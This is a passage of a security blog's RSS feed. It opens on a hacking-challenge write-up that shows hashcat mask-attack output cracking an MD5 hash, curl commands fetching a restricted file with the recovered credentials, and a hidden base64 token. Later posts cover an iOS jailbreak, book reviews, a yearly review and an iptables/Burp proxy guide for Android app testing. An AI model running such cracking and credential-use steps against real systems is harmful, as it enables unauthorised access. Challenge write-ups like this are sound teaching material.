Input.Mode: Mask (Hacker) [6]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hackert) [7]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hackerta) [8]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hackertag) [9]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hackertag?l) [10]
Index.....: 0/1 (segment), 26 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 26/26 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hackertag?l?l) [11]
Index.....: 0/1 (segment), 676 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 676/676 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hackertag?l?l?l) [12]
Index.....: 0/1 (segment), 17576 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 17576/17576 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--

d79a2543ddbb8042a6d14851fb098e0d:Hackertagblue

All hashes have been recovered

Input.Mode: Mask (Hackertag?l?l?l?l) [13]
Index.....: 0/1 (segment), 456976 (words), 0 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, 5.03M words
Progress..: 296192/456976 (64.82%)
Running...: --:--:--:--
Estimated.: --:--:--:--

Started: Wed Mar 18 21:45:47 2015
Stopped: Wed Mar 18 21:45:47 2015
</code></pre>
<p>We can verify that:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>echo -n <span style="color:#ed9d13">&#34;Hackertagblue&#34;</span> | md5sum
</code></pre></div><pre><code>d79a2543ddbb8042a6d14851fb098e0d  -
</code></pre>
<p>Perfect! Now we can use the passwort to access this link: http://82.195.79.41/restricted/index.php. Inside you&rsquo;ll see a image and nothing more:</p>
<p><img src="/posts/img/2015/hackertag/dc0eb3cacc8696cdbaa8604bfb89e25e.png" alt="hackertag"></p>
<p>But again let&rsquo;s have a look at the image itself:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
curl --user freddy:blue http://82.195.79.41/restricted/tour.jpg -o tour.jpg 2&gt; /dev/null
strings tour.jpg | grep <span style="color:#ed9d13">&#34;==&#34;</span>
</code></pre></div><pre><code>VG9rZW46IDU1MTI0Mw==
</code></pre>
<p>That looks interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>echo <span style="color:#ed9d13">&#34;VG9rZW46IDU1MTI0Mw==&#34;</span> | base64 -d
</code></pre></div><pre><code>Token: 551243
</code></pre>
<p>That&rsquo;s it! :)</p>
<p><img src="/posts/img/2015/hackertag/4f41c02eeeb8fbee62da2751ffd913bc.jpg" alt="hackertag"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>The iOS 8.1.3 fiasco</title>
      <link>https://blog.dornea.nu/2015/02/26/the-ios-8.1.3-fiasco/</link>
      <pubDate>Thu, 26 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/02/26/the-ios-8.1.3-fiasco/</guid>
      <content:encoded><![CDATA[<p>From time to time we all seem to ignore the &ldquo;voice of reason&rdquo; and tend to
unconsidered actions. This will be a short summary of what could go wrong
when one is forced to quick reactions which will result in chaos.</p>
<p>All started with an <a href="http://en.wikipedia.org/wiki/IPad_Air">iPad Air</a>. I have
jailbroken the device from the very first touch. That time <strong>iOS 7.x</strong> was installed
and a <a href="http://www.redmondpie.com/download-evasi0n-ios-7-7.0.4-jailbreak-for-iphone-5s-5c-5-ipad-ipod-touch-windows-mac/">jailbreak</a>
was available for that specific version (<strong>iOS 7.0.4</strong>). After months of testing and
without taking notice of the current iOS development, I&rsquo;ve found out that the installed
version was indeed out of date. At this time <strong>iOS 8.1.3</strong> is the latest stable iOS version.
My first thought was to update to <strong>iOS 7.1.2</strong> without loosing my <a href="http://www.evad3rs.net/2014/05/jailbreak-712-one-click-1-min.html">jailbreak</a>.
So I&rsquo;ve searched on <a href="http://www.ipswdownloader.com/">ipswdownloader.com/</a> for restore files for my device and downloaded them.
I&rsquo;ve soonly failed at restoring the image and downloaded another restore file (iOS 8.1.2).</p>
<p>At that moment I wasn&rsquo;t aware of this <a href="https://ipsw.me/all#iPad41">list</a> which contains a list
of all signable firmware versions. So I tried again and again. Doing that I was very &ldquo;amused&rdquo;
(not at all actually) to get intouch with <a href="https://www.apple.com/itunes/">iTunes</a>
which is very &ldquo;verbose&rdquo; when something fails. So I got very &ldquo;precise&rdquo; error codes like
<em>3004</em>, <em>3194</em>, <em>2005</em>, <em>17</em> and so on. C&rsquo;mon Apple, is that the way how error logging should work?
At least an error message could have helped. But one is always wiser afterwards. There is indeed
a <a href="http://support.apple.com/en-us/TS3694">list</a> containing details about update and restore errors. So I had:</p>
<ul>
<li><strong>network</strong> problems
<ul>
<li>Adapting the <em>hosts</em> file really helped in this case (have a look at this <a href="http://www.howtoisolve.com/how-to-fix-error-3194-in-itunes-step-by-step-solved/">tutorial</a>)</li>
</ul>
</li>
<li><strong>USB</strong> connections problems</li>
</ul>
<p>After solving those problems, I&rsquo;ve tried again to restore the firmware and failed hard. I repeat: I&rsquo;m not
an Apple expert nor an user. I use Apple products because I <strong>have</strong> to (due to my pentest activities at work).
So I didn&rsquo;t have a clue about this whole Apple firmware signing. I admit that somewhere I&rsquo;ve read that one should
not update to <strong>iOS 8.1.3</strong> yet since there are no jailbreaks yet. Ok, but what about <strong>downgrading</strong> the firmware?
&ldquo;That should work&rdquo;, I thought. <strong>WRONG</strong>!  I should have read the sources more precisely and pay more attention
to the previously mentioned <a href="https://ipsw.me/all#iPad41">list</a>. And I should point out with some more emphasis:</p>
<p>** Once you have upgraded to 8.1.3 you can NOT downgrade to a lower version! **</p>
<p>Well that&rsquo;s the part where I have been thrown into cold water (or should I say: in the <strong>Apple</strong> universe?) and got stuck with
<strong>8.1.3</strong>. The jailbreak was gone and there was no way to go back to <strong>7.1.2</strong> or <strong>8.1.2</strong>. <strong>But then I&rsquo;ve found this
<a href="http://phonerebel.com/ios-8-2-jailbreak-download-page/">page</a></strong>. And this indeed renewed my hope of getting my jailbreak back.</p>
<p>And this where the 2nd part of this crazy journey beginns. <strong>iOS 8.2 Beta 1/2</strong> is no longer available from the <a href="https://developer.apple.com/programs/ios/">Apples developer center</a>. So I have searched for some mirrors and found this <a href="miroir1.trackr.fr/miroirs.php?file=http://miroir.trackr.fr/iOS%208.2b2/iPad4,2_8.2_12D445d_Restore.ipsw">site</a>. The firmware is about <strong>2Gb</strong> and the download seemed
to last for days. So I&rsquo;ve decided to find another approach and found <a href="http://ibetacloud.com/#downloads">ibetacloud.com</a> which
had a much better DL rate. I have finally downloaded the beta image and was ready to try it again using iTunes. After another
cryptical error codes, I was finally able to <strong>update</strong> from 8.1.2 to <strong>8.2 beta</strong>! Hurray! But unfortunately this is not the end.</p>
<p>I have downloaded the <a href="http://www.evasi0njailbreak.com/download-evasi0n/taigios82.html">TaiG Jailbreak for iOS 8.2</a> and was
happy to see the finishing line ahead. <strong>It didn&rsquo;t work!</strong> Don&rsquo;t ask my why since the tool was full of Chinese signs. The only think
I could decrypt was a link which didn&rsquo;t help me at all. Somewhere I&rsquo;ve read again that the problem could maybe iTunes itself. They
said, the <strong>12.0.1</strong> version has to be installed which I&rsquo;ve found <a href="https://ipsw.me/iTunes">here</a>. Again another try with <em>TaiG 1.3</em> and voila: <strong>The iPad got jailbroken!</strong></p>
<p>So about the leasons learned?</p>
<ul>
<li>Read, read and read more precisely! (note to myself)</li>
<li>Apple&rsquo;s policy on updating/downgrading to another versions su&hellip; aehmm..is very strange</li>
<li>iTunes should get a more comprehensive list of error codes</li>
<li>Thanks to all brilliant jailbreakers out there!</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>GUIfy your Apps using Flask</title>
      <link>https://blog.dornea.nu/2015/02/05/guify-your-apps-using-flask/</link>
      <pubDate>Thu, 05 Feb 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/02/05/guify-your-apps-using-flask/</guid>
      <content:encoded><![CDATA[<p>If you follow this blog, you might have noticed that I&rsquo;m mainly interested in #infosec, #hacking and so on.
The main reason for writing this post was to encourage people to look behind the plate and make
their life more enjoyable (and still stay inside their comfort zone :). Ok, &ldquo;WTF?&rdquo; you&rsquo;re probably asking
yourself. Let me first start with a more detailed motivation behind this writing.</p>
<h2 id="motivation">Motivation</h2>
<p>Being involved in data analysis on a daily basis, I have to read and modify data in a quick and easy way.
Since I&rsquo;m the only person accessing the data I don&rsquo;t have to concern about multi-user, concurrency and such
stuff. Even if it&rsquo;s a simple SQLite DB, I just have my client - I recommend <a href="http://sqlitestudio.pl/">sqlitestudio</a> -
and there you go. Well this works if you don&rsquo;t really want to share your data with your team, allow them to modify
it or even allow reports to be generated. This approach is a more single-user one.</p>
<p>Well in the past few months (functional) requirements have changed. Among these:</p>
<ul>
<li>multi-user data access</li>
<li>multiple roles for accessing the data (read, write etc.)</li>
<li>easy data access due to additional software installation restrictions</li>
<li>charts!</li>
</ul>
<p>At the first moment this sounded very challenging and for somebody (like /me) who mainly just <em>uses</em>
some tools sth was clear: I have to do it on myself. Why reinvent the wheel? For me it was clear that
my ambitious plan had to be finished in reasonable amount of time. I didn&rsquo;t want to reinvent the wheel.
I just wanted to &ldquo;form&rdquo; it in such way to fullfil my very specific needs and requirements.</p>
<h2 id="data">Data!</h2>
<p>If you open your data analysis bibel you&rsquo;ll read: &ldquo;[&hellip;] and at the beginning the was a <strong>lot</strong> of data!&rdquo;
And when I&rsquo;m talking about data think of sth very complex that has to be first re-structured in order
to understand it. And because I use <a href="http://en.wikipedia.org/wiki/Relational_database_management_system">RDBMS</a>
I like to structure my data in:</p>
<ul>
<li><strong>entities</strong> and</li>
<li><strong>relationships</strong></li>
</ul>
<p>This way to you should be able to get a more high-level overview on your data. Try to think of useful
entities which should reflect the nature of your data. Besides that try to look for connections/relationships
between your data and define meaningful and deductive relations between your data entities. Once you have that
you can model your DB schema using a more high-level approach. I&rsquo;ve found <a href="http://www.sqlalchemy.org/">SQLAlchemy</a>
to be a very powerful framework to build SQL DB in a Pythonic way.</p>
<h2 id="define-your-models">Define your models</h2>
<h3 id="define-your-models-1">Define your models</h3>
<p>this is has to be written! :)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Android Hacker&#39;s Handbook</title>
      <link>https://blog.dornea.nu/2015/01/15/android-hackers-handbook/</link>
      <pubDate>Thu, 15 Jan 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/01/15/android-hackers-handbook/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2015/18add683b7e400d63d7172be60eb564a.jpg" alt="book"></p>
<p>What should I say about this book? A lot has been said and this uppon reasonable grounds. This book is meant to give
you an overview of the most important security topics related to Android. Not only you&rsquo;ll
get a lot of stuff about Android&rsquo;s internals, you&rsquo;ll also learn about exploits (and how they work)
targeting the this platform. I think I didn&rsquo;t have the time (and also the full knowledge) to look
at any specific detail this book covers. There is so much this book has to offer. I wish I had more time
to fully understand the exploits and get more into hardware hacking - a topic which is still very alien
to me. So if you intend becoming an Android hacker this, go buy this one. It&rsquo;s definitely worth the money!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>A practical guide to Advanced Networking</title>
      <link>https://blog.dornea.nu/2015/01/08/a-practical-guide-to-advanced-networking/</link>
      <pubDate>Thu, 08 Jan 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/01/08/a-practical-guide-to-advanced-networking/</guid>
      <content:encoded><![CDATA[<p>During the past months I was from time to time reading all kind of stuff related to networking and security. During this process I came accross this book:</p>
<p><img src="/posts/img/2015/3b9c034b88c3d5ea44bd4d6bc4436c0f.jpg" alt="book"></p>
<p>I found this book to be very comprehensive and very modern in sense of current topics
across the &ldquo;network universe&rdquo;. If you ever wanted to get a more deep insight in how
routers communicate with each other or how to setup a VoIP infrastructure, this book
is a must. Not only it provides very useful information to specific topics but it also
shows how to configure stuff using <em>Cisco</em> and <em>Juniper</em> hardware. At the end of each
topic you&rsquo;ll get a short summary and a list of questions aimed at helping you to
understand and internalize the material.</p>
<p>All in one a really good (e-)book on advanced networking, accompanied by good explanations
and visualizations.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>2014 - Personal review</title>
      <link>https://blog.dornea.nu/2014/12/22/2014-personal-review/</link>
      <pubDate>Mon, 22 Dec 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/12/22/2014-personal-review/</guid>
      <content:encoded><![CDATA[<p>Well, where should I start? Looking back at my blog <a href="http://blog.dornea.nu/archives">archives</a> I&rsquo;ve realized 2014 &ldquo;year of the <a href="http://blog.dornea.nu/tag/mobile/">mobile</a> apps&rdquo; - at least for me. I was heavily involved in analyzing mobile
applications: <em>Android</em> and <em>iOS</em>. For the first time in my whole infosec career path I was disassembling <a href="http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/">iOS</a> applications and doing stuff (binary analysis) I was used to (some years ago). Besides doing a lot of mobile apps analysis, I was pretty much involved in <em>structuring</em> and <em>hacking</em> data. Even though I think I&rsquo;ll go nuts once I read/hear <strong>&ldquo;BIG data&rdquo;</strong> one more time, I think data analysis is a field I&rsquo;d like to get deeper into. Visualizing and making it understandable for everyday Joe would make the whole topic more fancy. But let&rsquo;s stick to 2014 and break down the topics I&rsquo;ve dealt with in last 12 months&hellip;</p>
<h3 id="android">Android</h3>
<p>Regarding the Android stuff I must say one can automate a <strong>lot</strong> of things nowadays. If going straightforward you&rsquo;ll be following in most cases the same
procedure and applying several steps. For the same reason I&rsquo;ve released <a href="http://adus.dev.dornea.nu/">ADUS</a>, the Android debug utility suite. It
helped me a lot automating things and concentrate on the code and applications behaviour. Besides that I&rsquo;ve found some cool Python frameworks out there helping me out with the analysis stuff:</p>
<ul>
<li>AndroGuard</li>
<li>Drozer</li>
<li>DroidBox</li>
</ul>
<h3 id="python">Python</h3>
<p>Oh&hellip; and speaking of Python: I have to mention <a href="http://ipython.org/">IPython</a>, espcially IPython <a href="http://ipython.org/notebook.html">Notebook</a>.
I have discovered a new way of interacting with data, analyzing and finally visualizing it. <a href="http://pandas.pydata.org/">Pandas</a> has tons of useful
functions to structure, manipulate or plot your data. And besides that I&rsquo;ve &ldquo;re-discovered&rdquo; <em>SQLite</em> as a every-day DB for storing all kind of information. Using Python along with <a href="http://www.sqlalchemy.org/">SQLAlchemy</a> will make you the &ldquo;God of Big Data&rdquo; :) But for now you can call me &ldquo;Mr. SQL&rdquo; :p
My SQL and IPython skills can be admired in my <a href="http://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version/">24h Android sniffing post</a> and not only.</p>
<p>{% img <a href="https://camo.githubusercontent.com/aae0f057432f2f608ceec8bdabac32cd94876708/68747470733a2f2f7261772e6769746875622e636f6d2f636174686572696e656465766c696e2f69707974686f6e2d73716c2f6d61737465722f6578616d706c65732f777269746572732e706e67">https://camo.githubusercontent.com/aae0f057432f2f608ceec8bdabac32cd94876708/68747470733a2f2f7261772e6769746875622e636f6d2f636174686572696e656465766c696e2f69707974686f6e2d73716c2f6d61737465722f6578616d706c65732f777269746572732e706e67</a> ipython %}</p>
<h3 id="data-viz">Data viz</h3>
<p>If you go through my blog posts you&rsquo;ll notice a lot of graphics and diagrams. I like to <strong>visualize</strong> even simple things like <em>network packets</em>.
<a href="http://netgrafio.dornea.nu/">netgrafio</a> is a project I&rsquo;m really proud of. Visualizing network traffic shouldn&rsquo;t be seen as some kind of voodoo and has been done before netgrafio. However I liked the idea of implementing a more generic solution without any complex GUIs and just using a browser and web technologies. The project itself is in no way &ldquo;dead&rdquo; and will be updated by some new stuff as soon as I get more time to implement it. I&rsquo;m certainly searching for skilled Javascript devlopers to help me with the GUI and the JS stuff.
Just add your pull requests <a href="https://github.com/nullsecuritynet/netgrafio">here</a>.</p>
<p>{% img <a href="https://camo.githubusercontent.com/8e14c1276f0df3cf71ee81674b8fa38daf077dbc/687474703a2f2f646c2e646f726e65612e6e752f696d672f6e657467726166696f2f6e657467726166696f2d6d6f64756c652d616e616c797369732e706e67">https://camo.githubusercontent.com/8e14c1276f0df3cf71ee81674b8fa38daf077dbc/687474703a2f2f646c2e646f726e65612e6e752f696d672f6e657467726166696f2f6e657467726166696f2d6d6f64756c652d616e616c797369732e706e67</a> netgrafio %}</p>
<h3 id="security-threats">Security Threats</h3>
<p>Let&rsquo;s now talk about the #infosec community. In 2014 there have been some topics worth to be mentioned (just the main ones): <a href="http://heartbleed.com/">Heartbleed</a>, <a href="http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">Shellshock</a>, SSL/TSL <a href="http://en.wikipedia.org/wiki/POODLE">Poodle</a>. Do you know what they have in common? Fancy names, a good PR machine and fancy logos. In the case of the Heartbleed vulnerability, they had:</p>
<ul>
<li>a <a href="http://heartbleed.com">web-site</a></li>
<li>a fancy <a href="http://heartbleed.com/heartbleed.png">logo</a></li>
<li>a good time management before the vuln became public interest</li>
</ul>
<p>Bug hunters seem to know how to <em>promote</em> their findings and catch everybodys attention. Don&rsquo;t get me wrong but I don&rsquo;t think <code>CVE-2014-0160</code> would have been so interesting without all the PR engine behind it. And what about the lessons learned? I know crypto is hard, but the coding might be even harder. We have learned we should not trust any piece of software. Every single piece of code might be buggy or even contain critical vulnerabilities we aren&rsquo;t yet aware of. Individual audits and full disclosure might be a step towards better application security.
Also have a look at these security reports:</p>
<h4 id="annual-security-reports">Annual security reports</h4>
<ul>
<li><a href="http://www.cisco.com/web/offer/gist_ty2_asset/Cisco_2014_ASR.pdf">Cisco 2014 Annual Security Report</a></li>
<li><a href="https://www.sophos.com/en-us/medialibrary/PDFs/other/sophos-security-threat-report-2014.pdf">Sophos Security Threat Report 2014</a></li>
<li><a href="https://www.symantec.com/content/en/us/enterprise/other_resources/b-istr_main_report_v19_21291018.en-us.pdf">Symantec Internet Security Threat Report 2014</a></li>
<li><a href="http://www.fortinet.de/sites/default/files/whitepapers/Threat-Landscape-2014.pdf">Fortinet Threat Landscape Report 2014</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Proxy Non-Proxy-Aware Android Applications through Burp</title>
      <link>https://blog.dornea.nu/2014/12/02/howto-proxy-non-proxy-aware-android-applications-through-burp/</link>
      <pubDate>Tue, 02 Dec 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/12/02/howto-proxy-non-proxy-aware-android-applications-through-burp/</guid>
      <content:encoded><![CDATA[<p>Proxying HTTP(s) traffic from Android devices through Burp should be actually no magic. Nevertheless you&rsquo;ll have to take some important steps into consideration:</p>
<ul>
<li>
<p>Install Burps <strong>CA cert</strong> on the device</p>
<ul>
<li>I usually access Burp directly and download the cert file (<code>cacert.crt</code>)</li>
<li>If Burp is listening on <code>192.168.1.1:8080</code>, just go to <code>http://192.168.1.1:8080/cert</code> to download the cert</li>
<li>Push this file to your device and install the certificate</li>
</ul>
</li>
<li>
<p>Install <a href="https://play.google.com/store/apps/details?id=org.proxydroid&amp;hl=en"><strong>ProxyDroid</strong></a> on Android</p>
<ul>
<li>Set proxy setting <em>globally</em> or only for <em>certain</em> applications</li>
</ul>
</li>
</ul>
<p>In theory that&rsquo;s all! <strong>BUT</strong>: During recent mobile application pentest sessions, I&rsquo;ve noticed that sometimes applications traffic is not being passed through the proxy, especially when the application does <strong>not</strong> connect to standard HTTP ports like <code>80</code> or <code>443</code>. Besides that: What about SSDP and all other text-based protocols you would like to intercept in Burp? In most cases the proxy settings will simply be ignored and the traffic would be routed directly to the destination. In order to achieve my goal I&rsquo;ll be using <em>iptables</em> and some Burp settings most pentest aren&rsquo;t aware of. But first things first: The basics.</p>
<h3 id="virtual-pentest-environment">Virtual pentest environment</h3>
<p>Before getting into details let&rsquo;s &ldquo;virtually&rdquo; (rather mentally) create a network we can use as an example:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>nwdiag {
 internet [shape = cloud];
 internet -- router;

 network internal {
      address = &quot;192.x.x.x/24&quot;;

      router [address = &quot;192.x.x.1&quot;, shape=cisco.router];
      burp [address = &quot;192.x.x.2&quot;, shape=cisco.pc];
      android-client [address = &quot;192.x.x.3&quot;, shape=cisco.pda];
      others [address = &quot;192.x.x.4-100&quot;, shape=cisco.web_cluster];
  }
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx01.svg" alt="png"></p>
<p>So nothing special about it. The <em>burp</em> instance is running on my local machine and it&rsquo;s listening on <code>192.x.x.1:8080</code> for incoming connections.</p>
<h3 id="some-words-about-proxying">Some words about proxying</h3>
<p>Using <strong>no</strong> proxy at all, your client (in our case the target application) will have <em>no</em> pre-routed connections to its destinations. It will access them directly:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
  	android-client  -&gt; webserver [label = &quot;GET /index.html\nHost: www.example.com&quot;];
  	android-client &lt;-- webserver [label = &quot;HTTP/1.1 200 OK&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx02.png" alt="png"></p>
<p>Using <em>burp</em> as a proxy it will act as an intermediate between the <code>webserver</code> and the <code>client</code>:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
	android-client  -&gt; burp [label = &quot;GET /index.html\nHost: www.example.com&quot;];
  	 				   burp  -&gt; webserver [label = &quot;GET /index.html\nHost: www.example.com&quot;];
  	 				   burp &lt;-- webserver [label = &quot;HTTP/1.1 200 OK&quot;];
  	android-client &lt;-- burp [label = &quot;HTTP/1.1 200 OK&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx03.png" alt="png"></p>
<p>Ok, so that&rsquo;s no big deal and works as expected as long as your application/client <em>knows</em> how to connect to the proxy and it&rsquo;s <em>aware</em> of that fact. But what about the clients that are <em>not</em> aware of the fact that their connection will be proxied? Let&rsquo;s have a closer look at this particular case.</p>
<h3 id="non-proxy-aware-clients">Non-proxy-aware clients</h3>
<p><strong>Proxy-aware</strong> clients need to be told how to connect to the proxy and the proxy server however knows how to connect to the final destination. <strong>Non-proxy-aware</strong> applications don&rsquo;t know that the connection is proxied through some other host. In that case some other <em>additional</em> steps are required to proxy the connection through Burp.</p>
<p>In most cases you&rsquo;ll have to <em>redirect</em> the packages at a lower OSI level (rather than the application layer). In concrete terms that means you&rsquo;ll have to redirect the IP packets on the <strong>android-client</strong> to the <strong>burp</strong> instance. Burp instead must know where to redirect the packets (answer from <code>webserver</code>) back. This is the point where you&rsquo;ll need your operating system handle some things for you.</p>
<h3 id="some-words-on-redirects">Some words on redirects</h3>
<p>On most <em>Linux</em> based hosts you&rsquo;ll have <code>iptables</code> installed which will help us out with packet filtering / redirects. By rooting your Android device you should be able to take advantage of using iptables. Otherwise I&rsquo;d recommend you <a href="https://play.google.com/store/apps/details?id=org.dyndns.sven_ola.debian_kit&amp;hl=en">Debian Kit</a>. The general iptables packet traversal scheme looks like this:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>blockdiag {
	packet [shape=beginpoint];
	system;
	prerouting;
	is_forward [shape=flowchart.condition, label=&quot;Forward?&quot;, width=&quot;150&quot;, height=&quot;80&quot;, fontsize=18];
    forward;
	input;
	output;
	final_output [shape=dots, label=&quot;destination&quot;];
	postrouting;

	packet -&gt; prerouting -&gt; is_forward [folded]; 
	is_forward -&gt; input [label=&quot;no&quot;, textcolor=&quot;red&quot;];
    input -&gt; system -&gt; output;

    is_forward -&gt; forward [label=&quot;yes&quot;, textcolor=&quot;green&quot;];
    forward -&gt; postrouting;
	output -&gt; postrouting;
	postrouting -&gt; final_output;
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx04.png" alt="png"></p>
<p>In reality the truth is more <a href="http://www.adminsehow.com/wp-content/uploads/2011/09/tables_traverse.jpg">complicated</a>. And besides that there are several <a href="https://wiki.archlinux.org/index.php/iptables#TablesJust"><em>tables</em></a> which I haven&rsquo;t taken into consideration. And speaking of tables: The <em>filter</em> and <em>nat</em> ones are those you&rsquo;ll mostly deal with. But like already mentioned: For the sake of simplicity &hellip; :)</p>
<p>Since we are generating packets <em>locally</em> (on <strong>android-client</strong>) the <em>output</em> firewall chain is our main point of interest.</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>blockdiag {
	packet [shape=beginpoint];
	system;
	prerouting;
	is_forward [shape=flowchart.condition, label=&quot;Forward?&quot;, width=&quot;150&quot;, height=&quot;80&quot;, fontsize=18];
    forward;
	input;
	output [color=&quot;#CCFF33&quot;, fontsize=18];
	final_output [shape=dots, label=&quot;destination&quot;];
	postrouting;

	packet -&gt; prerouting -&gt; is_forward [folded]; 
	is_forward -&gt; input [label=&quot;no&quot;, textcolor=&quot;red&quot;];
    input -&gt; system -&gt; output;

    is_forward -&gt; forward [label=&quot;yes&quot;, textcolor=&quot;green&quot;];
    forward -&gt; postrouting;
	output -&gt; postrouting;
	postrouting -&gt; final_output;
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx05.png" alt="png"></p>
<p>While forwarding and re-routing packets between the <strong>android-client</strong> and the <strong>webserver</strong> through <strong>burp</strong> you won&rsquo;t be able to avoid  <a href="http://en.wikipedia.org/wiki/Network_address_translation"><em>NAT</em></a> (Network Address Translation). While modifying certain headers in the <em>IP</em> datagrams, packets are &ldquo;re-mapped&rdquo; from one IP address to another one. iptables can handle NAT (<code>-t nat</code>) and has 3 predefined chains: <em>PREROUTING</em>, <em>OUTPUT</em> and <em>POSTROUTING</em>.</p>
<h3 id="proxying-with-proxydroid">Proxying with ProxyDroid</h3>
<p>Before getting into the cool stuff, let&rsquo;s see what happens when <strong>ProxyDroid</strong> is used. You can use it only on a <em>rooted</em> device since internally it depends on <em>iptables</em>.</p>
<h4 id="http">HTTP</h4>
<p>I&rsquo;ve used these settings:</p>
<ul>
<li><em>Host</em>: 192.168.1.2</li>
<li><em>Port</em>: 8080</li>
<li><em>Proxy-Type</em>: HTTP</li>
</ul>
<p>On <code>192.168.1.2</code> <strong>burp</strong> is listening in port <code>8080</code> for incoming connections. Now let&rsquo;s have a look at the iptables rules:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client-# iptables -t nat -L                                              

[...]

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
RETURN     tcp  --  anywhere             192.168.1.2
REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:www redir ports 8123
REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:https redir ports 8124
REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:5228 redir ports 8124

[...]

</code></pre></div><p>We can see that:</p>
<ul>
<li>Every TCP-Connection with destination port <code>www</code> (80) will be redirected to <code>localhost:8123</code></li>
<li>Every TCP-Connection with destination port <code>https</code> (443) will be redirected to <code>localhost:8124</code></li>
</ul>
<p>Apparently <em>ProxyDroid</em> itself listens on ports <em>8123, 8124</em> for incoming connections before redirecting them to <strong>burp</strong>. Just for the sake of completeness, let&rsquo;s have a look at the <em>other</em> proxy types.</p>
<h4 id="socks4">SOCKS4</h4>
<p>Using <code>SOCKS4</code> as proxy type you&rsquo;ll get:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# iptables -t nat -L

[...]

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
RETURN     tcp  --  anywhere             192.168.1.2
REDIRECT   tcp  --  anywhere             anywhere             redir ports 8123

[...]

</code></pre></div><p>Regardless of the port all connection will be redirected first to <code>localhost:8123</code> (ProxyDroid) and then to the specified <code>&lt;host&gt;:&lt;port&gt;</code> pair.</p>
<h4 id="socks5">SOCKS5</h4>
